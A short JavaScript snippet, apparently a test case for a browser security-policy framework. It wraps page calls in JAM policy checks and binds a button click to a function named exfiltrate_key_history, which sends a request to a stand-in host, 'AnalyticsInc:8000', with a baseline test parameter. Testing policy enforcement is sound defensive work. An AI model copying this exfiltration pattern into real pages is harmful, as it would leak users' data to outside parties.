function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  JAM.call(JAM.get(xmlhttp, "open", JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074), xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true]);
  xmlhttp.send(null);
  return
}
var v0 = document.getElementById("test");
JAM.set(v0, "onclick", exfiltrate_key_history);
